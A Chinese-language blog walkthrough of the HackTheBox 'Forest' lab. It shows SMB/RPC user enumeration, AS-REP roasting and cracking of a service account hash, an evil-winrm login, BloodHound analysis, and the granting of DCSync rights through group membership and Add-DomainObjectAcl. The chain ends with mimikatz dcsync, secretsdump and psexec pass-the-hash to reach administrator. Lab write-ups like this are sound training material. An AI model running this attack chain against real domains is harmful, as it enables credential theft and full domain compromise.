@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Forest Walkthrough | 最后的家</title><meta name="keywords" content="SMB,Kerberos,Golden-Ticket"><meta name="author" content="Fre4k5en"><meta name="copyright" content="Fre4k5en"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Gathering information1Nmap -sC -sV -p- forest.htb   53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local 查看域名解析记录 1dig @10.129.1.77 forest.htb   查看SMB共享，这里允许匿名登录但是没有共享内容 1smbclient -N -L forest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Forest Walkthrough">
+<meta property="og:url" content="http://fre4k5en.me/2020/12/14/HackTheBox-Forest-Walkthrough/">
+<meta property="og:site_name" content="最后的家">
+<meta property="og:description" content="Gathering information1Nmap -sC -sV -p- forest.htb   53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local 查看域名解析记录 1dig @10.129.1.77 forest.htb   查看SMB共享，这里允许匿名登录但是没有共享内容 1smbclient -N -L forest">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bloodhound.readthedocs.io/en/latest/_images/bloodhound-logo.png">
+<meta property="article:published_time" content="2020-12-14T08:29:21.000Z">
+<meta property="article:modified_time" content="2021-07-09T11:14:16.002Z">
+<meta property="article:author" content="Fre4k5en">
+<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="Kerberos">
+<meta property="article:tag" content="Golden-Ticket">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bloodhound.readthedocs.io/en/latest/_images/bloodhound-logo.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fre4k5en.me/2020/12/14/HackTheBox-Forest-Walkthrough/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?980a0f26f7aefb599af14da60901958e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-09 19:14:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://tva1.sinaimg.cn/large/008i3skNgy1gs3mb17khej30j10j1aas.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">最后的家</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">HackTheBox Forest Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-14T08:29:21.000Z" title="发表于 2020-12-14 16:29:21">2020-12-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-09T11:14:16.002Z" title="更新于 2021-07-09 19:14:16">2021-07-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB/">HTB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HackTheBox Forest Walkthrough"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a>Gathering information</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sC -sV -p- forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg" alt="image-20201214173846004"></p>
+<p>53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local</p>
+<p>查看域名解析记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.129.1.77 forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnh33emnmj30yw0lkn0k.jpg" alt="image-20201214163839196"></p>
+<p>查看SMB共享，这里允许匿名登录但是没有共享内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnh5vltvvj30q005igm3.jpg" alt="image-20201214164125854"></p>
+<p>RPC(Remote Procedure Call，远程过程调用)，用于不同服务器之间调用方法，RPC框架把不同的调用方法封装起来，可以使得调用远程方法像调用本地方法一样简单</p>
+<p>利用Samba套件下的rpcclient查看rpc服务，匿名登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# rpcclient forest.htb -U%</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnhk97nb2j30m60tcafg.jpg" alt="image-20201214165513974"></p>
+<p>爆出了很多用户名，我们把SM_*和Health*去掉，整理一下得到以下用户</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnho2vfltj30fk0a0q3k.jpg" alt="image-20201214165855239"></p>
+<h3 id="爆破低权限账户凭证"><a href="#爆破低权限账户凭证" class="headerlink" title="爆破低权限账户凭证"></a>爆破低权限账户凭证</h3><p>Kerberos安全框架通常需要密码验证，但是存在选项“Do not require Kerberos preauthentication” 或 UF_DONT_REQUIRE_PREAUTH，如果被设置为true，则不需要Kerberos预身份验证就可导出密码</p>
+<p>利用impacket套件中的GetNPUsers.py脚本</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glni8m2oepj31ow0dg0wp.jpg" alt="image-20201214171839320"></p>
+<p>可以获取到用户svc-alfresco的加密密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$svc-alfresco@HTB.LOCAL:ce4fa143712d710440cd0e93b77542c1$41595c658e3c839195f999dad62c36c80d1db8892f41d8f497797c24ebe60f39a7d316133f18539f6bb4ccd0cfc81f610c61ec51b8e1f6b5050a72e78267ab18fd18ef93f456dddf6ec9997a69f3b331e84377f4e04777e9d5948ffa823953aa58d3ab72b52ea76c1377c750264d19a8988d219576c8a5797fc5cb437a588a4764e65993a07c61cafddaddca9bf627e3396f193c3aba1323aeafc1a25845056e133a5e3b7f488ed5cf3e4b26faa60cf42e99f86bded9a3e5bbb1d1a818f1022586426aba76e04e0b04c5c04e4da05d1af3ef85d85a1c4d2ae9b501c5026ac8900ed105ddd0e8</span><br></pre></td></tr></table></figure>
+
+<p>上JohnTheRipper或者hashcat，采用kali自带的rockyou字典</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glniflrc08j31kw07ytam.jpg" alt="image-20201214172522067"></p>
+<p>密码为s3rvice</p>
+<p>下载安装evil-winrm，通过5985端口连接服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gem install evil-winrm</span><br><span class="line"></span><br><span class="line">evil-winrm -i 10.129.1.77 -u svc-alfresco -p s3rvice -P 5985 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnimjmcnhj324g0rotes.jpg" alt="image-20201214173202854"></p>
+<p>得到svc-alfresco账户权限</p>
+<h3 id="获取系统权限"><a href="#获取系统权限" class="headerlink" title="获取系统权限"></a>获取系统权限</h3><p>将我们准备好的sharphound.exe上传并收集信息，再将结果下载到hound环境，选择<u>Find Shortest Paths to Domain Admins</u>（寻找到域管理员的最短路径）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; upload /root/SharpHound.exe</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; ./SharpHound.exe -c all</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; download xxx.zip</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gloobhb2f7j31c80sq79o.jpg" alt="image-20201215173431845"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gloo8rxpg6j30u00vfn15.jpg" alt="image-20201215173150914"></p>
+<p>可以看到我们是exchange组的成员，而exchange组对htb.local有一个叫做WriteDacL的权限，通过初步学习得知，通过writedacl权限，我们可以使用dcsync:mimikatz从krbtgt账户的hash制作Golden TIcket（黄金票据），登录域控。而Exchage Trusted Subsystem（exchage信任的子系统）也有这个权限，控制这个子系统的是account operatiors（账户操作员），而我们正是这个组的成员。</p>
+<h5 id="新建账户5en，将svc-alfresco加入exchange组"><a href="#新建账户5en，将svc-alfresco加入exchange组" class="headerlink" title="新建账户5en，将svc-alfresco加入exchange组"></a>新建账户5en，将svc-alfresco加入exchange组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user 账户 密码 /add /domain</span><br><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Windows Permissions&quot; svc-alfresco /add</span><br><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Trusted Subsystem&quot; svc-alfresco /add</span><br><span class="line"></span><br><span class="line">###Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; svc-alfresco /add</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="赋予5en账户DCSync权限"><a href="#赋予5en账户DCSync权限" class="headerlink" title="赋予5en账户DCSync权限"></a>赋予5en账户DCSync权限</h5><p>hound中自带了WriteDacL的help，里面有利用方式</p>
+<blockquote>
+<p>To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.</p>
+<p>–要对域对象使用WriteDacl，你需要赋予自己DcSync权限</p>
+<p>You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS <a href="mailto:&#80;&#x45;&#82;&#77;&#73;&#x53;&#x53;&#73;&#x4f;&#x4e;&#83;&#64;&#x48;&#x54;&#x42;&#x2e;&#76;&#x4f;&#x43;&#x41;&#76;">&#80;&#x45;&#82;&#77;&#73;&#x53;&#x53;&#73;&#x4f;&#x4e;&#83;&#64;&#x48;&#x54;&#x42;&#x2e;&#76;&#x4f;&#x43;&#x41;&#76;</a> if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
+<p>–如果你不是EXCHANGE WINDOWS <a href="mailto:&#80;&#69;&#82;&#x4d;&#73;&#83;&#83;&#73;&#x4f;&#78;&#x53;&#64;&#x48;&#84;&#x42;&#x2e;&#x4c;&#79;&#x43;&#65;&#76;">&#80;&#69;&#82;&#x4d;&#73;&#83;&#83;&#73;&#x4f;&#78;&#x53;&#64;&#x48;&#84;&#x42;&#x2e;&#x4c;&#79;&#x43;&#65;&#76;</a>对成员，你需要以它的成员的身份获取域控的凭证。结合Add-DomainObjectAcl功能，首先创建一个PS凭证对象（这些例子来自PowerView 帮助手册）</p>
+<p>$SecPassword = ConvertTo-SecureString ‘Password123!’ -AsPlainText -Force<br>$Cred = New-Object System.Management.Automation.PSCredential(‘TESTLAB\dfm.a’, $SecPassword)</p>
+<p>Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS <a href="mailto:&#x50;&#69;&#x52;&#x4d;&#x49;&#83;&#x53;&#73;&#79;&#78;&#x53;&#64;&#72;&#x54;&#66;&#46;&#x4c;&#79;&#67;&#x41;&#76;">&#x50;&#69;&#x52;&#x4d;&#x49;&#83;&#x53;&#73;&#79;&#78;&#x53;&#64;&#72;&#x54;&#66;&#46;&#x4c;&#79;&#67;&#x41;&#76;</a>:</p>
+<p>–然后，使用Add-DomainObjectAcl，如果你没有在EXCHANGE WINDOWS <a href="mailto:&#80;&#69;&#82;&#x4d;&#73;&#x53;&#83;&#73;&#x4f;&#x4e;&#x53;&#x40;&#72;&#84;&#x42;&#46;&#76;&#79;&#x43;&#65;&#x4c;">&#80;&#69;&#82;&#x4d;&#73;&#x53;&#83;&#73;&#x4f;&#x4e;&#x53;&#x40;&#72;&#84;&#x42;&#46;&#76;&#79;&#x43;&#65;&#x4c;</a>中，可以选择具体的$Cred</p>
+<p>Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</p>
+<p>Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain</p>
+<p>–一旦你有了DCSync权限，你可以使用mimikatz dcsync功能获取域内任意账号的密码</p>
+<p>lsadump::dcsync /domain:testlab.local /user:Administrator</p>
+<p>Cleanup can be done using the Remove-DomainObjectAcl function:<br>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</p>
+<p>在使用Remove-DomainObjectAcl 方法后可以做清理</p>
+</blockquote>
+<p>–后为笔者三流英语译文</p>
+<p>按照hound中的流程走一遍</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp1ccxl5zj30u00ur7dh.jpg" alt="image-20201216010512209"></p>
+<p>使用secretdump.py通过5en账户导出administrator的密码hash</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0semdr6j30xg0u07n1.jpg" alt="image-20201216004600962"></p>
+<p>psexec.py 通过hash连接目标administrator账户</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0vavsvaj30zy0gwgp6.jpg" alt="image-20201216004848556"></p>
+<p>获取系统权限</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Fre4k5en</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fre4k5en.me/2020/12/14/HackTheBox-Forest-Walkthrough/">http://fre4k5en.me/2020/12/14/HackTheBox-Forest-Walkthrough/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://fre4k5en.me" target="_blank">最后的家</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SMB/">SMB</a><a class="post-meta__tags" href="/tags/Kerberos/">Kerberos</a><a class="post-meta__tags" href="/tags/Golden-Ticket/">Golden-Ticket</a></div><div class="post_share"><div class="social-share" data-image="https://bloodhound.readthedocs.io/en/latest/_images/bloodhound-logo.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/22/Parallels%E4%B8%8B%E5%AE%89%E8%A3%85kali%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85Parallels-Tools%E8%A7%A3%E5%86%B3%EF%BC%88%E4%B8%AA%F0%9F%94%A8%EF%BC%8C%E6%B2%A1%E8%A7%A3%E5%86%B3%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Parallels下安装kali无法安装Parallels Tools解决（个🔨，没解决）</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/14/HackTheBox-Postman-Walkthrough/"><img class="next-cover" src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3jrbffj30pg0laamp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HackTheBox Postman Walkthrough</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gathering-information"><span class="toc-number">1.</span> <span class="toc-text">Gathering information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E4%BD%8E%E6%9D%83%E9%99%90%E8%B4%A6%E6%88%B7%E5%87%AD%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">爆破低权限账户凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text">获取系统权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E8%B4%A6%E6%88%B75en%EF%BC%8C%E5%B0%86svc-alfresco%E5%8A%A0%E5%85%A5exchange%E7%BB%84"><span class="toc-number">3.0.1.</span> <span class="toc-text">新建账户5en，将svc-alfresco加入exchange组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B5%8B%E4%BA%885en%E8%B4%A6%E6%88%B7DCSync%E6%9D%83%E9%99%90"><span class="toc-number">3.0.2.</span> <span class="toc-text">赋予5en账户DCSync权限</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Fre4k5en</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
